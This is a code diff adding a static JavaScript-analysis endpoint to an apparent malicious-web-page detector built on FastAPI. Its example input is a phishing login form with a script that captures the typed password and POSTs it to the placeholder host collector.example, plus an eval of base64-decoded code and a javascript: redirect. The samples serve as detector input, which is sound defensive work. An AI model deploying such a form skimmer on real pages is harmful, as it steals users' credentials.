@@ -1,4 +1,4 @@
-"""Public API routes: Part 2 preprocessing, Part 3 DOM features, Part 9 analysis (stub).
+"""Public API routes: Part 2 preprocessing, Part 3 DOM features, Part 7 JS analysis, Part 9 (stub).
 
 Part 9: Preliminary tri-modal output (fusion + FastAPI).
 """
@@ -9,9 +9,11 @@ from fastapi import APIRouter, HTTPException, Response
 from pydantic import BaseModel, ConfigDict, Field
 
 from c2_analyzer.dom.pipeline import dom_features_for_html
+from c2_analyzer.js_analyzer.pipeline import js_analysis_for_html
 from c2_analyzer.preprocessing.pipeline import preprocess_html
 from c2_analyzer.schemas.analysis import AnalysisRequest, AnalysisResponse
 from c2_analyzer.schemas.dom import DomResult
+from c2_analyzer.schemas.js import JsAnalysisResult
 from c2_analyzer.schemas.parsed_page import ParsedPage
 
 router = APIRouter()
@@ -83,6 +85,54 @@ def dom_features(request: PreprocessRequest) -> Response:
     code as ``extract_dom_features.py`` - the numbers match the training CSV.
     """
     result = dom_features_for_html(request.html, request.url)
+    return Response(result.model_dump_json(), media_type="application/json")
+
+
+EXAMPLE_JS_HTML = (
+    '<html><body><form id="login"><input type="password" id="password">'
+    "<button>Sign in</button></form><script>"
+    "document.getElementById('login').addEventListener('submit', function (e) {"
+    " e.preventDefault(); var pwd = document.getElementById('password').value;"
+    " fetch('https://collector.example/c', {method: 'POST', body: JSON.stringify({p: pwd})});"
+    " window['eval'](atob('YWxlcnQoMSk='));"
+    "});</script></body></html>"
+)
+
+
+class JsAnalysisRequest(PreprocessRequest):
+    """Input to ``POST /api/v1/js-analysis`` (same fields as /preprocess)."""
+
+    model_config = ConfigDict(
+        json_schema_extra={
+            "examples": [
+                {"html": EXAMPLE_JS_HTML, "url": "https://bank.example/login"},
+                {
+                    "html": "<a href=\"javascript:location.replace('https://x.example/')\">go</a>"
+                    '<body oncontextmenu="return false">',
+                    "url": None,
+                },
+            ]
+        }
+    )
+
+
+@router.post(
+    "/api/v1/js-analysis",
+    response_model=JsAnalysisResult,
+    tags=["JS analysis (Part 7)"],
+    summary="HTML -> static JavaScript detections + feature vector (Part 7, no verdict)",
+    responses={413: {"description": "request body larger than 5 MB"}},
+)
+def js_analysis(request: JsAnalysisRequest) -> Response:
+    """Run Part 2 then Part 7 on one HTML string.
+
+    Parses every inline script, event handler and javascript: URL with
+    tree-sitter (never executes anything) and reports API usage with line
+    numbers, arguments and PII-masked snippets, plus the js_v1 feature vector.
+    External ``<script src>`` files are NOT downloaded (reference only). Same
+    code as ``analyze_js.py`` - the numbers match the dataset CSV.
+    """
+    result = js_analysis_for_html(request.html, request.url)
     return Response(result.model_dump_json(), media_type="application/json")
 
 
